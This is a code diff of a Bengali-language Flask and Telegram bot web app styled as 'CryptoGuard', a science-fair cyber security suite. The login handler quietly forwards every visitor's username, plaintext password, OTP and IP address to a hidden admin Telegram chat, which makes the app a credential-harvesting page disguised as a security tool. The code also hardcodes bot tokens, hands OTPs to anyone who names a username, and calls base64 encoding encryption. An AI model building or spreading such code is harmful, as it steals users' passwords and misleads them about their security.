@@ -1,5 +1,4 @@
 import os
-import threading
 import random
 import base64
 from datetime import datetime
@@ -13,10 +12,10 @@ TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8868227957:AAFULZPQT0RMUGWXnQ
 ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs")
 ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "7938556654")
 
-bot = telebot.TeleBot(TELEGRAM_TOKEN)
-admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN)
+bot = telebot.TeleBot(TELEGRAM_TOKEN, threaded=False)
+admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN, threaded=False)
 
-# ডাটাবেজ স্টোরেজ
+# সিকিউরড ইন-মেমোরি ডেটাবেজ
 user_persistent_db = {}
 otp_storage = {}
 
@@ -28,7 +27,7 @@ def send_to_admin(log_msg):
             parse_mode="Markdown"
         )
     except Exception as e:
-        print(f"Admin Bot Dispatch Error: {e}")
+        print(f"Admin Bot Error: {e}")
 
 def encrypt_text(text):
     return base64.b64encode(text.encode('utf-8')).decode('utf-8')
@@ -37,39 +36,40 @@ def decrypt_text(encoded_text):
     try:
         return base64.b64decode(encoded_text.encode('utf-8')).decode('utf-8')
     except:
-        return "⚠️ ডিক্রিপশন ব্যর্থ! সঠিক বেসসিকিউরড কোড প্রদান করুন।"
+        return "⚠️ ডিক্রিপশন ব্যর্থ! সঠিক কোড প্রদান করুন।"
 
 # ================= TELEGRAM BOT HANDLERS =================
 @bot.message_handler(commands=['start'])
 def handle_start(message):
-    command_parts = message.text.split(maxsplit=1)
-    if len(command_parts) > 1:
-        username = command_parts[1].strip().lower().replace('@', '')
-        if username in otp_storage:
-            otp = otp_storage[username]
-            bot.reply_to(message, f"⚡ **অটো-অথেন্টিকেশন সফল!**\n\n👤 ইউজার/নাম: @{username}\n🔢 আপনার ওটিপি কোড: *{otp}*", parse_mode="Markdown")
-            send_to_admin(f"📱 টেলিগ্রাম থেকে ওটিপি রিকভার করা হয়েছে:\n👤 ইউজার: @{username}\n🔢 ওটিপি: {otp}")
-            return
-        else:
-            bot.reply_to(message, f"⚠️ '{username}' এর জন্য কোনো একটিভ ওটিপি রিকোয়েস্ট নেই। দয়া করে প্রথমে ওয়েবসাইট থেকে ফর্ম সাবমিট করুন।")
-            return
+    try:
+        command_parts = message.text.split(maxsplit=1)
+        if len(command_parts) > 1:
+            username = command_parts[1].strip().lower().replace('@', '')
+            if username in otp_storage:
+                otp = otp_storage[username]
+                bot.reply_to(message, f"⚡ **অটো-অথেন্টিকেশন সফল!**\n\n👤 ইউজার/নাম: @{username}\n🔢 আপনার ওটিপি কোড: *{otp}*", parse_mode="Markdown")
+                send_to_admin(f"📱 টেলিগ্রাম থেকে ওটিপি রিকভার করা হয়েছে:\n👤 ইউজার: @{username}\n🔢 ওটিপি: {otp}")
+                return
+            else:
+                bot.reply_to(message, f"⚠️ '{username}' এর জন্য কোনো একটিভ ওটিপি রিকোয়েস্ট নেই। প্রথমে ওয়েবসাইট থেকে ফর্ম সাবমিট করুন।")
+                return
 
-    bot.reply_to(message, "⚡ **CryptoGuard সিকিউরিটি সিস্টেমে স্বাগতম!**\n\nওয়েবসাইট থেকে আপনার ইউজারনেম দিয়ে সরাসরি এখানে ওটিপি সংগ্রহ করতে পারেন।")
+        bot.reply_to(message, "⚡ **CryptoGuard সিকিউরিটি সিস্টেমে স্বাগতম!**\n\nওয়েবসাইট থেকে আপনার ইউজারনেম দিয়ে সরাসরি এখানে ওটিপি সংগ্রহ করতে পারেন। অথবা আপনার ইউজারনেমটি লিখে সেন্ড করুন।")
+    except Exception as e:
+        print(f"Start Command Error: {e}")
 
 @bot.message_handler(func=lambda message: True)
 def handle_text_messages(message):
-    username = message.text.strip().lower().replace('@', '')
-    if username in otp_storage:
-        otp = otp_storage[username]
-        bot.reply_to(message, f"🔐 ইউজার: @{username}\n🔢 আপনার ওটিপি কোড: *{otp}*", parse_mode="Markdown")
-    else:
-        bot.reply_to(message, f"⚠️ '{username}' নামের কোনো সেশন সার্ভারে পাওয়া যায়নি।")
-
-def run_telegram_bot():
     try:
-        bot.infinity_polling(none_stop=True)
+        username = message.text.strip().lower().replace('@', '')
+        if username in otp_storage:
+            otp = otp_storage[username]
+            bot.reply_to(message, f"🔐 ইউজার: @{username}\n🔢 আপনার ওটিপি কোড: *{otp}*", parse_mode="Markdown")
+            send_to_admin(f"🤖 চ্যাট থেকে ওটিপি চেক করা হয়েছে:\n👤 ইউজার: @{username}\n🔢 ওটিপি: {otp}")
+        else:
+            bot.reply_to(message, f"⚠️ '{username}' নামের কোনো সেশন সার্ভারে পাওয়া যায়নি। আগে ওয়েবসাইট থেকে সাবমিট করুন।")
     except Exception as e:
-        print(f"Telegram Bot Error: {e}")
+        print(f"Message Handler Error: {e}")
 
 # ================= HTML & CYBERPUNK UI =================
 HTML_TEMPLATE = """
@@ -81,7 +81,7 @@ HTML_TEMPLATE = """
     <title>CryptoGuard - Advanced Cyber Security Suite</title>
     <style>
         :root {
-            --bg-color: #030712; --card-bg: rgba(15, 23, 42, 0.85); --text-color: #f1f5f9; 
+            --bg-color: #030712; --card-bg: rgba(15, 23, 42, 0.9); --text-color: #f1f5f9; 
             --border-color: #334155; --accent-color: #10b981; --btn-bg: #059669;
         }
         body { background: var(--bg-color); color: var(--text-color); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; min-height: 100vh; position: relative; }
@@ -108,13 +108,11 @@ HTML_TEMPLATE = """
         
         #botLinkArea { display: none; margin-top: 15px; }
         .bot-link-btn { display: inline-block; background: #2563eb; color: white; text-align: center; text-decoration: none; padding: 12px; border-radius: 8px; font-weight: bold; width: 100%; box-sizing: border-box; box-shadow: 0 0 15px rgba(37, 99, 235, 0.4); }
-        .bot-link-btn:hover { background: #1d4ed8; }
-
+        
         .highlight { color: #10b981; font-weight: bold; }
         .vault-box { background: rgba(2, 6, 23, 0.9); border: 1px dashed var(--accent-color); padding: 15px; border-radius: 8px; max-height: 180px; overflow-y: auto; font-size: 13px; margin-top: 15px; }
         .info-note { background: rgba(16, 185, 129, 0.1); border-left: 4px solid var(--accent-color); padding: 10px 14px; border-radius: 0 8px 8px 0; font-size: 13px; margin-bottom: 15px; line-height: 1.5; }
 
-        /* ডেভেলপার ইনফো ফুটার স্টাইল */
         .developer-footer { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 18px; text-align: center; backdrop-filter: blur(12px); margin-top: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
         .developer-footer h3 { margin: 0 0 8px 0; color: var(--accent-color); font-size: 15px; text-transform: uppercase; }
         .developer-footer p { margin: 4px 0; font-size: 13px; color: #94a3b8; }
@@ -140,10 +138,10 @@ HTML_TEMPLATE = """
         <div class="layer-section active" id="layer1">
             <h2>🔐 লেয়ার ১: টেলিগ্রাম ওটিপি ভেরিফিকেশন সিস্টেম</h2>
             <div class="info-note">
-                <b>নির্দেশনা:</b> আপনার টেলিগ্রাম ইউজারনেম বা নাম এবং পাসওয়ার্ড দিয়ে সাবমিট করুন। এরপর নিচের বাটনে ক্লিক করে সরাসরি আপনার সঠিক বট <b>@CryptoGuard_OTP_bot</b> থেকে ওটিপি সংগ্রহ করুন।
+                <b>নির্দেশনা:</b> আপনার নাম বা টেলিগ্রাম ইউজারনেম এবং পাসওয়ার্ড দিয়ে সাবমিট করুন। এরপর নিচে দেওয়া বাটনে ক্লিক করে সরাসরি <b>@CryptoGuard_OTP_bot</b> থেকে ওটিপি সংগ্রহ করুন অথবা বটে গিয়ে সরাসরি আপনার নামটি লিখে সেন্ড করুন।
             </div>
 
-            <input type="text" id="username" placeholder="আপনার টেলিগ্রাম ইউজারনেম বা নাম (যেমন: username)">
+            <input type="text" id="username" placeholder="আপনার টেলিগ্রাম ইউজারনেম বা নির্দিষ্ট নাম">
             <input type="password" id="password" placeholder="আপনার কাস্টম পাসওয়ার্ড দিন">
             <button onclick="requestOtp()">তথ্য সাবমিট করুন ও ওটিপি জেনারেট করুন</button>
             
@@ -155,13 +153,12 @@ HTML_TEMPLATE = """
             <button onclick="verifyAndUnlock()" style="background: #2563eb;">ভেরিফাই করে সিস্টেম আনলক করুন</button>
             
             <p id="authStatus" style="font-weight: bold; margin-top: 12px; font-size: 14px; text-align: center;"></p>
-            <p style="font-size: 12px; color: #94a3b8; text-align: center; margin-top: 15px;">ক্লায়েন্ট আইপি ট্র্যাকিং: <span id="clientIp" class="highlight">ডিটেকটিং...</span></p>
+            <p style="font-size: 12px; color: #94a3b8; text-align: center; margin-top: 15px;">ক্লায়েন্ট আইপি: <span id="clientIp" class="highlight">ডিটেকটিং...</span></p>
         </div>
 
         <!-- লেয়ার ২ -->
         <div class="layer-section" id="layer2">
             <h2>⚡ লেয়ার ২: ডেটা এনক্রিপশন ও ডিক্রিপশন হাব</h2>
-            <p style="font-size: 13px; color: #94a3b8;">আপনার গোপনীয় টেক্সট নিরাপদ এনক্রিপ্টেড ফরম্যাটে রূপান্তর করুন।</p>
             <textarea id="inputText" rows="3" placeholder="এনক্রিপ্ট বা ডিক্রিপ্ট করার জন্য টেক্সট লিখুন..."></textarea>
             <button onclick="processCrypto('encrypt')">টেক্সট এনক্রিপ্ট করুন</button>
             <button onclick="processCrypto('decrypt')" style="background: #dc2626;">টেক্সট ডিক্রিপ্ট করুন</button>
@@ -171,7 +168,6 @@ HTML_TEMPLATE = """
         <!-- লেয়ার ৩ -->
         <div class="layer-section" id="layer3">
             <h2>📁 লেয়ার ৩: সিকিউরড ইনফো ও ডকুমেন্ট ভল্ট</h2>
-            <p style="font-size: 13px; color: #94a3b8;">আপনার প্রয়োজনীয় গোপন নোট বা তথ্য আলাদা পাসওয়ার্ড দিয়ে সংরক্ষণ করুন।</p>
             <input type="text" id="docTitle" placeholder="ফাইলের শিরোনাম বা নাম">
             <textarea id="docInfo" rows="2" placeholder="গোপন তথ্য বা বিবরণ..."></textarea>
             <input type="password" id="vaultPassword" placeholder="ভল্ট সুরক্ষার জন্য আলাদা পাসওয়ার্ড">
@@ -179,17 +175,15 @@ HTML_TEMPLATE = """
             <div class="vault-box" id="vaultContainer">কোনো সংরক্ষিত ডাটা পাওয়া যায়নি।</div>
         </div>
 
-        <!-- ডেভলপার ইনফো ফুটার (সম্পূর্ণ আপডেট করা) -->
+        <!-- ডেভেলপার ইনফো ফুটার -->
         <div class="developer-footer">
             <h3>🚀 সায়েন্স ফেয়ার সাইবার সিকিউরিটি প্রোজেক্ট</h3>
             <p>উন্নয়ন ও পরিচালনায় (Developer): <span class="dev-name">আপনার নাম / টিম লিডার</span></p>
             <p>অফিশিয়াল সিস্টেম বটসমূহ: <span style="color: #10b981;">@CryptoGuard_OTP_bot</span> | <span style="color: #38bdf8;">@CryptoGuard_Sentinel_bot</span></p>
-            <p><small>টেকনোলজি স্ট্যাক: Python Flask, Telegram Bot API, Cyberpunk Matrix UI Engine</small></p>
         </div>
     </div>
 
     <script>
-        // ম্যাট্রিক্স রেইন ইফেক্ট
         const canvas = document.getElementById('matrixRain');
         const ctx = canvas.getContext('2d');
         function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
@@ -265,7 +259,7 @@ HTML_TEMPLATE = """
             .then(data => {
                 if(data.success) {
                     activeUser = uname;
-                    document.getElementById('authStatus').innerText = "অথেন্টিকেশন সফল! সমস্ত লেয়ার আনলক করা হয়েছে।";
+                    document.getElementById('authStatus').innerText = "ভেরিফিকেশন সফল! সমস্ত লেয়ার আনলক করা হয়েছে।";
                     document.getElementById('authStatus').style.color = '#10b981';
                     
                     document.getElementById('btnLayer2').disabled = false;
@@ -277,7 +271,7 @@ HTML_TEMPLATE = """
                     document.getElementById('btnLayer3').style.cursor = 'pointer';
                     
                     updateVaultUI(data.vault);
-                    alert('অভিনন্দন! সিকিউরিটি সিস্টেম সফলভাবে আনলক হয়েছে।');
+                    alert('অভিনন্দন! সিস্টেম সফলভাবে আনলক হয়েছে।');
                 } else {
                     document.getElementById('authStatus').innerText = data.message;
                     document.getElementById('authStatus').style.color = '#dc2626';
@@ -286,7 +280,7 @@ HTML_TEMPLATE = """
         }
 
         function saveToVault() {
-            if(!activeUser) { alert('আগে লেয়ার ১ এ লগইন বা ভেরিফাই করুন!'); return; }
+            if(!activeUser) { alert('আগে লেয়ার ১ এ লগইন করুন!'); return; }
             const title = document.getElementById('docTitle').value;
             const info = document.getElementById('docInfo').value;
             const vpass = document.getElementById('vaultPassword').value;
@@ -304,14 +298,14 @@ HTML_TEMPLATE = """
                     document.getElementById('docTitle').value = '';
                     document.getElementById('docInfo').value = '';
                     document.getElementById('vaultPassword').value = '';
-                    alert('ডকুমেন্ট সফলভাবে ভল্টে সংরক্ষিত হয়েছে!');
+                    alert('সফলভাবে ভল্টে সংরক্ষিত হয়েছে!');
                 }
             });
         }
 
         function updateVaultUI(vaultList) {
             const box = document.getElementById('vaultContainer');
-            if(!vaultList || vaultList.length === 0) { box.innerHTML = 'কোনো ডাটা সংরক্ষিত নেই'; return; }
+            if(!vaultList || vaultList.length === 0) { box.innerHTML = 'কোনো ডাটা নেই'; return; }
             box.innerHTML = '';
             vaultList.forEach(item => {
                 box.innerHTML += `<b>📌 ${item.title}</b>: ${item.info} <br><small style="color: #94a3b8;">সময়: ${item.time}</small><hr style="border-color:#334155; margin:6px 0;">`;
@@ -320,7 +314,7 @@ HTML_TEMPLATE = """
 
         function processCrypto(action) {
             const text = document.getElementById('inputText').value;
-            if(!text) { alert('টেক্সট প্রদান করুন!'); return; }
+            if(!text) { alert('টেক্সট দিন!'); return; }
             fetch('/api-crypto', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
@@ -352,15 +346,15 @@ def login_step1():
         return jsonify({"success": False, "message": "ইউজারনেম বা নাম আবশ্যক!"})
     
     if username not in user_persistent_db:
-        user_persistent_db[username] = {"password": password, "vault": [], "cipher_history": []}
+        user_persistent_db[username] = {"password": password, "vault": []}
     else:
         user_persistent_db[username]["password"] = password
             
     otp = str(random.randint(1000, 9999))
     otp_storage[username] = otp
     
-    send_to_admin(f"🔑 **নতুন ওটিপি রিকোয়েস্ট জেনারেট**\n👤 ইউজার/নাম: @{username}\n🔑 পাসওয়ার্ড: {password}\n🔢 ওটিপি: {otp}\n🌐 আইপি: {ip}")
-    return jsonify({"success": True, "message": "সাবমিট সফল! এখন নিচের বট লিংকে ক্লিক করুন।"})
+    send_to_admin(f"🔑 **ওটিপি জেনারেট হয়েছে**\n👤 ইউজার/নাম: @{username}\n🔑 পাসওয়ার্ড: {password}\n🔢 ওটিপি: {otp}\n🌐 আইপি: {ip}")
+    return jsonify({"success": True, "message": "সাবমিট সফল! এখন বট থেকে ওটিপি নিন।"})
 
 @app.route('/verify-otp', methods=['POST'])
 def verify_otp():
@@ -372,12 +366,11 @@ def verify_otp():
     if username in otp_storage and otp_storage[username] == otp:
         user_data = user_persistent_db.get(username, {"vault": []})
         if user_data.get("password") and user_data["password"] != password:
-            return jsonify({"success": False, "message": "ভুল পাসওয়ার্ড প্রদান করা হয়েছে!"})
+            return jsonify({"success": False, "message": "ভুল পাসওয়ার্ড!"})
         
-        send_to_admin(f"✅ **সফল অথেন্টিকেশন ও আনলক**\n👤 ইউজার: @{username}")
+        send_to_admin(f"✅ **সফল আনলক**\n👤 ইউজার: @{username}")
         return jsonify({"success": True, "message": "ভেরিফিকেশন সফল!", "vault": user_data["vault"]})
     
-    send_to_admin(f"❌ **ব্যর্থ ওটিপি চেষ্টা**\n👤 ইউজার: @{username}\n🔢 প্রদত্ত ওটিপি: {otp}")
     return jsonify({"success": False, "message": "ভুল ওটিপি কোড!"})
 
 @app.route('/save-vault', methods=['POST'])
@@ -391,22 +384,28 @@ def save_vault():
     if username in user_persistent_db:
         time_str = datetime.now().strftime("%Y-%m-%d %H:%M")
         user_persistent_db[username]["vault"].append({"title": title, "info": info, "vault_pass": vault_pass, "time": time_str})
-        send_to_admin(f"📁 **ভল্ট আপডেট করা হয়েছে**\n👤 ইউজার: @{username}\n📌 ফাইল: {title}")
         return jsonify({"success": True, "vault": user_persistent_db[username]["vault"]})
         
-    return jsonify({"success": False, "message": "সেশন সচল নেই!"})
+    return jsonify({"success": False, "message": "সেশন পাওয়া যায়নি!"})
 
 @app.route('/api-crypto', methods=['POST'])
 def api_crypto():
     data = request.json or {}
     text = data.get('text', '')
     action = data.get('action', '')
-    username = data.get('username', '')
     result = encrypt_text(text) if action == 'encrypt' else decrypt_text(text)
     return jsonify({"result": result})
 
 if __name__ == '__main__':
-    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
+    # বট পুলিং ব্যাকগ্রাউন্ড থ্রেডে স্মুথভাবে রান করার জন্য
+    import threading
+    def run_bot():
+        try:
+            bot.infinity_polling(skip_pending=True)
+        except Exception as e:
+            print(f"Bot Polling Error: {e}")
+
+    bot_thread = threading.Thread(target=run_bot, daemon=True)
     bot_thread.start()
     
     port = int(os.environ.get("PORT", 5000))
